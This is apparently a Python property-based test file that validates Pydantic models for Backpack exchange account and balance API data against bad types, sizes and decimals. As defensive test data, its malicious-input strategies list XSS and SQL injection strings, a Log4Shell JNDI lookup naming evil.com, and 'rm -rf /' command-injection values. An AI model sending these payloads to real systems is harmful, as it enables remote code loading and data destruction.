"""Property-based tests for Backpack raw account models.

These tests validate critical security boundary models that process external API data.
The models tested here protect against malicious input and ensure financial data integrity.

SECURITY CRITICAL: These raw models are the first line of defense against:
- Malicious API responses that could manipulate account data
- Financial data corruption through decimal field tampering
- Buffer overflow attacks through oversized string fields
- Injection attacks through status enum manipulation
- Unicode encoding attacks through malformed text

Property testing ensures comprehensive coverage of edge cases and adversarial inputs.
"""

from decimal import Decimal
from typing import Any

import pytest
from hypothesis import assume, given, strategies as st
from hypothesis.strategies import SearchStrategy
from pydantic import ValidationError

from cyberdelta.apis.backpack.models.bp_raw_account import (
    BackpackRawAccount,
    BackpackRawBalanceResponse,
)
from cyberdelta.apis.exceptions.field_validation import DecimalFiniteError
from cyberdelta.exceptions.field_validation import TypeFieldError
from cyberdelta.exceptions.parsing import EmptyStringError


# =============================================================================
# HYPOTHESIS STRATEGIES FOR ACCOUNT MODEL TESTING
# =============================================================================


def account_id_strategy() -> SearchStrategy[str]:
    """Generate valid account ID strings.

    Returns:
        A Hypothesis strategy for valid account ID strings.
    """
    return st.one_of([
        # Common formats
        st.text(
            min_size=1,
            max_size=128,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="_-"
            ),
        ),
        # Typical patterns
        st.just("user_123"),
        st.just("account_456789"),
        st.just("bp_user_abc123def"),
        # Edge cases
        st.text(min_size=1, max_size=128).filter(
            lambda x: x.strip() and len(x.encode("utf-8")) <= 128
        ),
    ])


def email_strategy() -> SearchStrategy[str]:
    """Generate valid email address strings.

    Returns:
        A Hypothesis strategy for valid email address strings.
    """
    return st.one_of([
        # Standard email formats
        st.emails().filter(lambda x: len(x) <= 254),
        # Common patterns
        st.just("user@example.com"),
        st.just("test@backpack.exchange"),
        st.just("trader123@gmail.com"),
        # Unicode emails
        st.text(
            min_size=5,
            max_size=254,
            alphabet=st.characters(
                whitelist_categories=["Lu", "Ll", "Nd"], whitelist_characters="@._-"
            ),
        ).filter(lambda x: "@" in x and "." in x.split("@")[-1] and len(x.encode("utf-8")) <= 254),
    ])


def account_status_strategy() -> SearchStrategy[str]:
    """Generate valid account status enum values.

    Returns:
        A Hypothesis strategy for valid account status strings.
    """
    return st.sampled_from(["active", "suspended", "pending"])


def decimal_string_strategy() -> SearchStrategy[str]:
    """Generate decimal strings for balance fields.

    Returns:
        A Hypothesis strategy for decimal balance strings.
    """
    return st.one_of([
        # Common balance formats
        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=8).map(str),
        st.decimals(min_value=Decimal(0), max_value=Decimal(100000), places=6).map(str),
        # Edge cases
        st.just("0"),
        st.just("0.0"),
        st.just("0.00000001"),  # Minimum precision
        st.just("999999.99999999"),  # Large balance
        # Scientific notation (valid for decimal parsing)
        st.just("1e6"),
        st.just("1.5e3"),
    ])


@st.composite
def valid_account_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid account data structure.

    Returns:
        A dictionary with valid account data fields.
    """
    return {
        "id": draw(account_id_strategy()),
        "email": draw(email_strategy()),
        "status": draw(account_status_strategy()),
    }


@st.composite
def valid_balance_data(draw: st.DrawFn) -> dict[str, str]:
    """Generate valid balance response data structure.

    Returns:
        A dictionary with valid balance data fields.
    """
    return {
        "available": draw(decimal_string_strategy()),
        "locked": draw(decimal_string_strategy()),
        "staked": draw(decimal_string_strategy()),
    }


def malicious_string_strategy() -> SearchStrategy[str]:
    """Generate malicious strings for security testing.

    Returns:
        A Hypothesis strategy for malicious string values.
    """
    return st.one_of([
        # XSS attempts
        st.just("<script>alert('xss')</script>"),
        st.just("<img src=x onerror=alert(1)>"),
        # SQL injection attempts
        st.just("'; DROP TABLE users;--"),
        st.just("1' OR '1'='1"),
        # Buffer overflow attempts
        st.text(min_size=1000, max_size=1500),
        st.just("A" * 1500),
        # Unicode attacks
        st.just("\udce2\udc28\udc00"),  # Lone surrogates
        st.just("\x00\x01\x02"),  # Control characters
        # Format string attacks
        st.just("%s%s%s%s%s%s%s%s%s%s"),
        st.just("${jndi:ldap://evil.com/a}"),
        # Command injection
        st.just("; rm -rf /"),
        st.just("`rm -rf /`"),
    ])


def invalid_type_strategy() -> SearchStrategy[
    int | float | bool | list[str] | dict[str, str] | bytes | None
]:
    """Generate invalid types for field validation testing.

    Returns:
        A Hypothesis strategy for invalid type values.
    """
    return st.one_of([
        st.none(),
        st.integers(),
        st.floats(),
        st.booleans(),
        st.lists(st.text()),
        st.dictionaries(st.text(), st.text()),
        st.binary(),
    ])


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW ACCOUNT MODEL
# =============================================================================


class TestBackpackRawAccountProperties:
    """Property-based tests for BackpackRawAccount validation and security."""

    @given(account_data=valid_account_data())
    def test_account_validation_success_properties(self, account_data: dict[str, str]) -> None:
        """Property: Valid account data should always create valid BackpackRawAccount objects."""
        # Skip empty strings which should be rejected
        assume(account_data["id"].strip())
        assume(account_data["email"].strip() and "@" in account_data["email"])
        assume(account_data["status"] in {"active", "suspended", "pending"})

        try:
            obj = BackpackRawAccount.model_validate(account_data)

            # Property: Object should be created successfully
            assert isinstance(obj, BackpackRawAccount)

            # Property: All fields should be preserved as strings
            assert isinstance(obj.id, str)
            assert isinstance(obj.email, str)
            assert isinstance(obj.status, str)

            # Property: Values should be preserved exactly
            assert obj.id == account_data["id"]
            assert obj.email == account_data["email"]
            assert obj.status == account_data["status"]

            # Property: Model should be configured correctly
            assert obj.model_config.get("extra") == "forbid"
            assert obj.model_config.get("populate_by_name") is True

        except ValidationError as e:
            # If validation fails, it should be for a good reason
            error_msg = str(e)
            # Should fail for oversized fields or invalid formats
            is_oversized = (
                len(account_data["id"].encode("utf-8")) > 128
                or len(account_data["email"].encode("utf-8")) > 254
                or len(account_data["status"].encode("utf-8")) > 32
            )
            if not is_oversized:
                pytest.fail(f"Valid account data should not fail validation: {error_msg}")

    @given(
        field_name=st.sampled_from(["id", "email", "status"]),
        malicious_value=malicious_string_strategy(),
    )
    def test_account_security_boundary_properties(
        self, field_name: str, malicious_value: str
    ) -> None:
        """Property: Account model should reject malicious inputs safely."""
        base_data = {
            "id": "user_123",
            "email": "user@example.com",
            "status": "active",
        }
        base_data[field_name] = malicious_value

        # Property: Malicious input should be rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawAccount.model_validate(base_data)

    @given(
        field_name=st.sampled_from(["id", "email", "status"]), invalid_value=invalid_type_strategy()
    )
    def test_account_type_safety_properties(
        self,
        field_name: str,
        invalid_value: float | bool | list[str] | dict[str, str] | bytes | None,
    ) -> None:
        """Property: Account model should enforce strict type safety."""
        base_data: dict[str, Any] = {
            "id": "user_123",
            "email": "user@example.com",
            "status": "active",
        }
        base_data[field_name] = invalid_value

        # Property: Wrong types should be rejected
        with pytest.raises((ValidationError, TypeError)):
            BackpackRawAccount.model_validate(base_data)

    @given(
        id_str=st.text(min_size=1, max_size=200),
        email_str=st.text(min_size=1, max_size=300),
        status_str=st.text(min_size=1, max_size=50),
    )
    def test_account_length_limits_properties(
        self, id_str: str, email_str: str, status_str: str
    ) -> None:
        """Property: Account fields should enforce proper length limits."""
        account_data = {
            "id": id_str,
            "email": email_str,
            "status": status_str,
        }

        try:
            obj = BackpackRawAccount.model_validate(account_data)

            # Property: If validation succeeds, lengths should be within limits
            assert len(obj.id.encode("utf-8")) <= 128
            assert len(obj.email.encode("utf-8")) <= 254
            assert len(obj.status.encode("utf-8")) <= 32

            # Property: Valid status should be from allowed enum
            assert obj.status in {"active", "suspended", "pending"}

        except (ValidationError, TypeFieldError, EmptyStringError):
            # Property: Should fail for oversized or invalid inputs
            is_oversized = (
                len(id_str.encode("utf-8")) > 128
                or len(email_str.encode("utf-8")) > 254
                or len(status_str.encode("utf-8")) > 32
            )
            is_invalid_status = status_str not in {"active", "suspended", "pending"}
            is_empty = not id_str.strip() or not email_str.strip() or not status_str.strip()

            # Should fail for good reasons
            assert is_oversized or is_invalid_status or is_empty

    @given(account_data=valid_account_data())
    def test_account_immutability_properties(self, account_data: dict[str, str]) -> None:
        """Property: Account objects should be immutable after creation."""
        assume(account_data["id"].strip())
        assume(account_data["email"].strip() and "@" in account_data["email"])
        assume(account_data["status"] in {"active", "suspended", "pending"})

        try:
            obj = BackpackRawAccount.model_validate(account_data)

            # Property: Fields should not be modifiable
            with pytest.raises(ValidationError, match="Instance is frozen"):
                obj.id = "modified_id"

            with pytest.raises(ValidationError, match="Instance is frozen"):
                obj.status = "modified_status"

        except ValidationError:
            # Skip if validation fails for other reasons
            pass

    @given(missing_field=st.sampled_from(["id", "email", "status"]))
    def test_account_required_fields_properties(self, missing_field: str) -> None:
        """Property: All account fields should be required."""
        base_data = {
            "id": "user_123",
            "email": "user@example.com",
            "status": "active",
        }
        del base_data[missing_field]

        # Property: Missing required fields should cause validation error
        with pytest.raises(ValidationError) as exc_info:
            BackpackRawAccount.model_validate(base_data)

        # Property: Error should mention the missing field
        error_msg = str(exc_info.value)
        assert "Field required" in error_msg or missing_field in error_msg

    @given(status=account_status_strategy())
    def test_account_status_enum_properties(self, status: str) -> None:
        """Property: All valid status values should be accepted."""
        account_data = {
            "id": "user_123",
            "email": "user@example.com",
            "status": status,
        }

        obj = BackpackRawAccount.model_validate(account_data)

        # Property: Status should be preserved exactly
        assert obj.status == status

        # Property: Status should be one of allowed values
        assert status in {"active", "suspended", "pending"}

    @given(
        invalid_status=st.one_of([
            st.just("Active"),  # Wrong case
            st.just("ACTIVE"),  # Wrong case
            st.just("pending "),  # Trailing space
            st.just(""),  # Empty
            st.just("   "),  # Whitespace only
            st.just("notastatus"),  # Invalid value
            st.just("😀"),  # Emoji
            st.just("<script>"),  # XSS attempt
            st.just("active; DROP TABLE users;"),  # SQL injection
            st.text(min_size=1).filter(lambda x: x not in {"active", "suspended", "pending"}),
        ])
    )
    def test_account_invalid_status_properties(self, invalid_status: str) -> None:
        """Property: Invalid status values should be rejected consistently."""
        account_data = {
            "id": "user_123",
            "email": "user@example.com",
            "status": invalid_status,
        }

        # Property: Invalid status should cause appropriate error
        if not invalid_status.strip():
            with pytest.raises(EmptyStringError):
                BackpackRawAccount.model_validate(account_data)
        else:
            with pytest.raises(ValidationError) as exc_info:
                BackpackRawAccount.model_validate(account_data)
            # Property: Error should indicate invalid enum value
            error_msg = str(exc_info.value)
            assert "Invalid value" in error_msg or "not in allowed values" in error_msg.lower()

    @given(
        field=st.sampled_from(["id", "email", "status"]),
        wrong_value=st.one_of([
            st.integers(),
            st.floats(),
            st.booleans(),
            st.lists(st.text()),
            st.dictionaries(st.text(), st.integers()),
            st.none(),
        ]),
    )
    def test_account_type_enforcement_properties(
        self, field: str, wrong_value: float | bool | list[str] | dict[str, str] | bytes | None
    ) -> None:
        """Property: Non-string values should be rejected with appropriate errors."""
        account_data: dict[str, Any] = {
            "id": "user_123",
            "email": "user@example.com",
            "status": "active",
        }
        account_data[field] = wrong_value

        # Property: Wrong types should cause TypeError
        with pytest.raises(TypeError) as exc_info:
            BackpackRawAccount.model_validate(account_data)

        # Property: Error should be informative about expected type
        error_msg = str(exc_info.value)
        assert (
            "string" in error_msg.lower() or "str" in error_msg.lower() or "Expected" in error_msg
        )

    @given(
        field=st.sampled_from(["id", "email", "status"]),
        adversarial_value=st.one_of([
            st.just(""),  # Empty string
            st.just("   "),  # Whitespace only
            st.text().filter(lambda x: not x.strip()),  # Various empty patterns
            st.just("user_😀"),  # Unicode
            st.just("user_123; DROP TABLE users;"),  # SQL injection
            st.just("<script>alert(1)</script>@example.com"),  # XSS
            st.just("user\x00@example.com"),  # Null bytes
            st.text(min_size=1000, max_size=5000),  # Oversized
            st.just("\udce2\udc28\udc00"),  # Malformed unicode
            st.just("A" * 500),  # Buffer overflow attempt
        ]),
    )
    def test_account_adversarial_input_properties(self, field: str, adversarial_value: str) -> None:
        """Property: Account model should safely handle adversarial inputs."""
        account_data = {
            "id": "user_123",
            "email": "user@example.com",
            "status": "active",
        }
        account_data[field] = adversarial_value

        try:
            obj = BackpackRawAccount.model_validate(account_data)

            # Property: If validation succeeds, field should be properly sanitized string
            field_value = getattr(obj, field)
            assert isinstance(field_value, str)

            # Property: Should not exceed length limits
            if field == "id":
                assert len(field_value.encode("utf-8")) <= 128
            elif field == "email":
                assert len(field_value.encode("utf-8")) <= 254
            elif field == "status":
                assert len(field_value.encode("utf-8")) <= 32
                assert field_value in {"active", "suspended", "pending"}

        except (ValidationError, TypeError, EmptyStringError, TypeFieldError):
            # Property: Errors should be for valid security reasons
            # Validation rejected the input as expected
            # The specific exception type depends on the validation logic
            # but all caught types are appropriate security validation errors
            pass

    @given(
        extra_field=st.text(min_size=1, max_size=20).filter(
            lambda x: x not in {"id", "email", "status"}
        ),
        extra_value=st.one_of([st.text(), st.integers(), st.booleans(), st.lists(st.text())]),
    )
    def test_account_extra_fields_rejection_properties(
        self, extra_field: str, extra_value: float | bool | str | list[str] | dict[str, str] | None
    ) -> None:
        """Property: Extra fields should always be rejected."""
        account_data = {
            "id": "user_123",
            "email": "user@example.com",
            "status": "active",
            extra_field: extra_value,
        }

        # Property: Extra fields should cause validation error
        with pytest.raises(ValidationError) as exc_info:
            BackpackRawAccount.model_validate(account_data)

        # Property: Error should indicate extra fields not permitted
        error_msg = str(exc_info.value)
        assert "Extra inputs are not permitted" in error_msg or "extra" in error_msg.lower()


# =============================================================================
# PROPERTY TESTS FOR BACKPACK RAW BALANCE RESPONSE MODEL
# =============================================================================


class TestBackpackRawBalanceResponseProperties:
    """Property-based tests for BackpackRawBalanceResponse validation and security."""

    @given(balance_data=valid_balance_data())
    def test_balance_validation_success_properties(self, balance_data: dict[str, str]) -> None:
        """Property: Valid balance data should create valid BackpackRawBalanceResponse objects."""
        # Skip non-finite decimal strings
        try:
            for field in ["available", "locked", "staked"]:
                decimal_val = Decimal(balance_data[field])
                assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)  # Skip invalid decimal strings

        obj = BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Object should be created successfully
        assert isinstance(obj, BackpackRawBalanceResponse)

        # Property: All fields should be preserved as strings
        assert isinstance(obj.available, str)
        assert isinstance(obj.locked, str)
        assert isinstance(obj.staked, str)

        # Property: Values should be preserved exactly
        assert obj.available == balance_data["available"]
        assert obj.locked == balance_data["locked"]
        assert obj.staked == balance_data["staked"]

        # Property: All values should be parseable as finite decimals
        assert Decimal(obj.available).is_finite()
        assert Decimal(obj.locked).is_finite()
        assert Decimal(obj.staked).is_finite()

        # Property: Model should be configured correctly
        assert obj.model_config.get("extra") == "forbid"
        assert obj.model_config.get("populate_by_name") is True

    @given(missing_field=st.sampled_from(["available", "locked", "staked"]))
    def test_balance_required_fields_properties(self, missing_field: str) -> None:
        """Property: All balance fields should be required."""
        balance_data = {
            "available": "1000.0",
            "locked": "0.0",
            "staked": "0.0",
        }
        del balance_data[missing_field]

        # Property: Missing required fields should cause validation error
        with pytest.raises(ValidationError) as exc_info:
            BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Error should mention the missing field
        error_msg = str(exc_info.value)
        assert "Field required" in error_msg or missing_field in error_msg

    @given(
        field=st.sampled_from(["available", "locked", "staked"]),
        decimal_value=st.one_of([
            # Valid decimals
            st.just("0"),
            st.just("-1.0"),
            st.just("1e6"),  # Scientific notation allowed
            st.just("1.5e3"),
            st.just("999999.99999999"),
            # Invalid decimals
            st.just("NaN"),
            st.just("inf"),
            st.just("-inf"),
            st.just("1..0"),  # Double decimal
            st.just("1.2.3"),  # Multiple decimals
            st.just("not_a_number"),
            st.just(""),  # Empty
            st.just("   "),  # Whitespace
        ]),
    )
    def test_balance_decimal_validation_properties(self, field: str, decimal_value: str) -> None:
        """Property: Balance fields should validate decimal strings properly."""
        balance_data = {
            "available": "1000.0",
            "locked": "0.0",
            "staked": "0.0",
        }
        balance_data[field] = decimal_value

        try:
            # Check if the value can be parsed as a finite decimal
            decimal_val = Decimal(decimal_value.strip() if decimal_value else "")
            is_finite = decimal_val.is_finite()
            is_empty = not decimal_value.strip()

            if is_finite and not is_empty:
                # Property: Valid finite decimals should be accepted
                obj = BackpackRawBalanceResponse.model_validate(balance_data)
                assert getattr(obj, field) == decimal_value

                # Property: Parsed value should be finite
                assert Decimal(getattr(obj, field)).is_finite()
            else:
                # Property: Non-finite or empty values should be rejected
                with pytest.raises((ValidationError, EmptyStringError, DecimalFiniteError)):
                    BackpackRawBalanceResponse.model_validate(balance_data)

        except (ValueError, TypeError):
            # Property: Unparseable decimal strings should be rejected
            with pytest.raises(ValidationError):
                BackpackRawBalanceResponse.model_validate(balance_data)

    @given(
        field=st.sampled_from(["available", "locked", "staked"]),
        malicious_value=st.one_of([
            st.just(""),  # Empty string
            st.just("   "),  # Whitespace only
            st.just("1000😀"),  # Unicode in decimal
            st.just("1000; DROP TABLE balances;"),  # SQL injection
            st.just("<img src=x onerror=alert(1)>"),  # XSS attempt
            st.just("${jndi:ldap://evil.com/a}"),  # Log4j attack
            st.just("%s%s%s%s"),  # Format string
            st.just("A" * 1000),  # Buffer overflow
            st.just("\udce2\udc28\udc00"),  # Malformed unicode
            st.text(min_size=100, max_size=1000).filter(  # Large garbage
                lambda x: not x.replace(".", "")
                .replace("-", "")
                .replace("e", "")
                .replace("E", "")
                .isdigit()
            ),
        ]),
    )
    def test_balance_adversarial_input_properties(self, field: str, malicious_value: str) -> None:
        """Property: Balance model should safely reject malicious decimal inputs."""
        balance_data = {
            "available": "1000.0",
            "locked": "0.0",
            "staked": "0.0",
        }
        balance_data[field] = malicious_value

        # Property: Malicious inputs should be rejected with appropriate errors
        if not malicious_value.strip():
            # Empty strings should raise EmptyStringError
            with pytest.raises(EmptyStringError):
                BackpackRawBalanceResponse.model_validate(balance_data)
        else:
            # All other malicious strings should raise ValidationError
            # because decimal fields must be parseable as numbers
            with pytest.raises(ValidationError):
                BackpackRawBalanceResponse.model_validate(balance_data)

    @given(
        extra_field=st.text(min_size=1, max_size=20).filter(
            lambda x: x not in {"available", "locked", "staked"}
        ),
        extra_value=st.one_of([st.text(), st.integers(), st.booleans()]),
    )
    def test_balance_extra_fields_rejection_properties(
        self, extra_field: str, extra_value: float | bool | str | list[str] | dict[str, str] | None
    ) -> None:
        """Property: Extra fields should always be rejected."""
        balance_data = {
            "available": "1000.0",
            "locked": "0.0",
            "staked": "0.0",
            extra_field: extra_value,
        }

        # Property: Extra fields should cause validation error
        with pytest.raises(ValidationError) as exc_info:
            BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Error should indicate extra fields not permitted
        error_msg = str(exc_info.value)
        assert "Extra inputs are not permitted" in error_msg

    @given(
        field=st.sampled_from(["available", "locked", "staked"]),
        corruption_value=st.one_of([
            st.none(),  # Null values
            st.binary(),  # Binary data
            st.dictionaries(st.text(), st.text()),  # Nested objects
            st.lists(st.text()),  # Lists
            st.integers(),  # Raw integers
            st.floats(),  # Raw floats
            st.just("\udce2\udc28\udc00"),  # Malformed unicode
            st.text(min_size=1000, max_size=1500),  # DoS-sized strings
            st.just('{"incomplete": '),  # Malformed JSON
            st.just("1000'; DROP TABLE balances;--"),  # SQL injection
        ]),
    )
    def test_balance_corruption_resistance_properties(
        self, field: str, corruption_value: float | bool | str | list[str] | dict[str, str] | None
    ) -> None:
        """Property: Balance model should resist all forms of data corruption."""
        balance_data: dict[str, Any] = {
            "available": "1000.0",
            "locked": "0.0",
            "staked": "0.0",
        }
        balance_data[field] = corruption_value

        # Property: All corruption attempts should be safely rejected
        with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
            BackpackRawBalanceResponse.model_validate(balance_data)

    @given(
        available=decimal_string_strategy(),
        locked=decimal_string_strategy(),
        staked=decimal_string_strategy(),
    )
    def test_balance_financial_precision_properties(
        self, available: str, locked: str, staked: str
    ) -> None:
        """Property: Balance model should preserve financial precision exactly."""
        # Only test valid finite decimals
        # Initialize to help static analysis
        avail_dec = locked_dec = staked_dec = Decimal(0)
        try:
            avail_dec = Decimal(available)
            locked_dec = Decimal(locked)
            staked_dec = Decimal(staked)
            assume(avail_dec.is_finite() and locked_dec.is_finite() and staked_dec.is_finite())
        except (ValueError, TypeError):
            assume(False)

        balance_data = {
            "available": available,
            "locked": locked,
            "staked": staked,
        }

        obj = BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Exact string values should be preserved
        assert obj.available == available
        assert obj.locked == locked
        assert obj.staked == staked

        # Property: Should be parseable back to same decimal values
        assert Decimal(obj.available) == avail_dec
        assert Decimal(obj.locked) == locked_dec
        assert Decimal(obj.staked) == staked_dec

        # Property: All values should remain finite
        assert Decimal(obj.available).is_finite()
        assert Decimal(obj.locked).is_finite()
        assert Decimal(obj.staked).is_finite()

    @given(balance_data=valid_balance_data())
    def test_balance_immutability_properties(self, balance_data: dict[str, str]) -> None:
        """Property: Balance objects should be immutable after creation."""
        # Only test valid finite decimals
        try:
            for field in ["available", "locked", "staked"]:
                decimal_val = Decimal(balance_data[field])
                assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        obj = BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Fields should not be modifiable
        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.available = "modified_available"

        with pytest.raises(ValidationError, match="Instance is frozen"):
            obj.locked = "modified_locked"

    @given(
        field=st.sampled_from(["available", "locked", "staked"]),
        invalid_type_value=invalid_type_strategy(),
    )
    def test_balance_type_safety_comprehensive_properties(
        self,
        field: str,
        invalid_type_value: float | bool | list[str] | dict[str, str] | bytes | None,
    ) -> None:
        """Property: Balance model should enforce comprehensive type safety."""
        balance_data: dict[str, Any] = {
            "available": "1000.0",
            "locked": "0.0",
            "staked": "0.0",
        }
        balance_data[field] = invalid_type_value

        # Property: Wrong types should be rejected
        with pytest.raises(TypeError) as exc_info:
            BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Error should be informative
        error_msg = str(exc_info.value)
        assert len(error_msg) > 0
        assert (
            "string" in error_msg.lower() or "str" in error_msg.lower() or "Expected" in error_msg
        )


# =============================================================================
# INTEGRATION PROPERTY TESTS
# =============================================================================


class TestBackpackRawAccountIntegrationProperties:
    """Integration property tests for both account models."""

    @given(account_data=valid_account_data(), balance_data=valid_balance_data())
    def test_models_consistency_properties(
        self, account_data: dict[str, str], balance_data: dict[str, str]
    ) -> None:
        """Property: Both models should have consistent validation behavior."""
        # Filter to valid inputs only
        assume(account_data["id"].strip())
        assume(account_data["email"].strip() and "@" in account_data["email"])
        assume(account_data["status"] in {"active", "suspended", "pending"})

        try:
            for field in ["available", "locked", "staked"]:
                decimal_val = Decimal(balance_data[field])
                assume(decimal_val.is_finite())
        except (ValueError, TypeError):
            assume(False)

        # Property: Both models should validate successfully with valid data
        account_obj = BackpackRawAccount.model_validate(account_data)
        balance_obj = BackpackRawBalanceResponse.model_validate(balance_data)

        # Property: Both should have consistent model configuration
        assert account_obj.model_config.get("extra") == "forbid"
        assert balance_obj.model_config.get("extra") == "forbid"
        assert account_obj.model_config.get("populate_by_name") is True
        assert balance_obj.model_config.get("populate_by_name") is True

    @given(
        malicious_data=st.dictionaries(
            st.sampled_from(["id", "email", "status", "available", "locked", "staked"]),
            malicious_string_strategy(),
        )
    )
    def test_models_security_boundary_properties(self, malicious_data: dict[str, Any]) -> None:
        """Property: Both models should consistently reject malicious inputs."""
        # Try to validate as account model if it has account fields
        if "id" in malicious_data or "email" in malicious_data or "status" in malicious_data:
            account_data = {
                "id": malicious_data.get("id", "user_123"),
                "email": malicious_data.get("email", "user@example.com"),
                "status": malicious_data.get("status", "active"),
            }

            # Property: Malicious account data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, TypeFieldError)):
                BackpackRawAccount.model_validate(account_data)

        # Try to validate as balance model if it has balance fields
        if (
            "available" in malicious_data
            or "locked" in malicious_data
            or "staked" in malicious_data
        ):
            balance_data = {
                "available": malicious_data.get("available", "1000.0"),
                "locked": malicious_data.get("locked", "0.0"),
                "staked": malicious_data.get("staked", "0.0"),
            }

            # Property: Malicious balance data should be rejected
            with pytest.raises((ValidationError, TypeError, EmptyStringError, DecimalFiniteError)):
                BackpackRawBalanceResponse.model_validate(balance_data)


# =============================================================================
# LEGACY COMPATIBILITY TESTS
# =============================================================================


def test_BackpackRawAccount_real_world_example() -> None:
    """Test with real-world-like data including Unicode characters."""
    payload = {
        "id": "user_Ωmega",
        "email": "user_😀@example.com",
        "status": "active",
    }
    obj = BackpackRawAccount.model_validate(payload)
    assert obj.id == "user_Ωmega"
    assert obj.email == "user_😀@example.com"
    assert obj.status == "active"


def test_BackpackRawBalance_real_world_example() -> None:
    """Test with real-world balance precision examples."""
    payload = {
        "available": "0.00000001",  # Satoshi precision
        "locked": "99999999.99999998",  # Large balance with precision
        "staked": "0.00000000",  # Zero balance
    }
    obj = BackpackRawBalanceResponse.model_validate(payload)
    assert obj.available == "0.00000001"
    assert obj.locked == "99999999.99999998"
    assert obj.staked == "0.00000000"
